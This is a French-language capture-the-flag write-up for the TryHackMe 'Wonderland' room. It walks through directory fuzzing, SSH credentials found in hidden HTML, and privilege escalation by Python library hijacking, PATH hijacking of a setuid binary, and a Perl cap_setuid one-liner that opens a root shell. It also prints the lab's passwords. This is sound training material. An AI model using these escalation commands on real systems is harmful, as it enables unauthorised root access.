# TryHackMe — Wonderland

**Difficulté :** Medium  
**Catégorie :** CTF / Linux PrivEsc  
**Plateforme :** TryHackMe

---

## Reconnaissance

Scan initial avec nmap pour identifier les services exposés, puis énumération des répertoires avec ffuf :

```bash
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Découverte du chemin caché `/r/a/b/b/i/t/` — l'URL épelle **RABBIT**, référence directe à Alice in Wonderland.

---

## Accès initial

Inspection du code source de la page `/r/a/b/b/i/t/` avec curl :

```bash
curl http://TARGET/r/a/b/b/i/t/
```

Credentials trouvés en clair dans un élément HTML masqué (`display: none`) :

```
alice : HowDothTheLittleCrocodileImproveHisShiningTail
```

Connexion SSH :

```bash
ssh alice@TARGET
```

---

## PrivEsc alice → rabbit

Vérification des droits sudo :

```bash
sudo -l
```

Alice peut exécuter un script Python en tant que **rabbit** :

```
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Le script importe la librairie `random`. Python cherche les modules dans le répertoire courant en premier — **Python Library Hijacking**.

Création d'un faux `random.py` dans `/home/alice/` :

```python
import os
os.system("/bin/bash")
```

Exécution :

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Shell obtenu en tant que **rabbit**.

---

## PrivEsc rabbit → hatter

Dans `/home/rabbit/`, présence d'un binaire setuid `teaParty`. Analyse avec `strings` :

```bash
strings teaParty
```

Le binaire appelle `date` sans chemin absolu :

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

**PATH Hijacking** : création d'un faux `date` dans `/tmp` :

```bash
echo '/bin/bash' > /tmp/date
chmod +x /tmp/date
export PATH=/tmp:$PATH
/home/rabbit/teaParty
```

Shell obtenu en tant que **hatter**. Récupération du mot de passe dans `password.txt` :

```
WhyIsARavenLikeAWritingDesk?
```

---

## PrivEsc hatter → root

Vérification des capabilities Linux :

```bash
getcap -r / 2>/dev/null
```

Résultat :

```
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.26.1 = cap_setuid+ep
```

Perl dispose de `cap_setuid` — il peut changer son UID vers 0 (root). Exploitation via GTFOBins :

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Shell **root** obtenu.

---

## Flags

> Wonderland inverse la logique : `user.txt` est dans `/root` et `root.txt` est dans `/home/alice`.

| Flag | Emplacement |
|------|-------------|
| user.txt | `/root/user.txt` |
| root.txt | `/home/alice/root.txt` |

---

## Résumé des techniques

| Étape | Technique |
|-------|-----------|
| Enum web | Directory fuzzing (ffuf) |
| Creds | Credentials dans le source HTML |
| alice → rabbit | Python Library Hijacking |
| rabbit → hatter | PATH Hijacking (binaire setuid) |
| hatter → root | Linux Capabilities (cap_setuid + perl) |
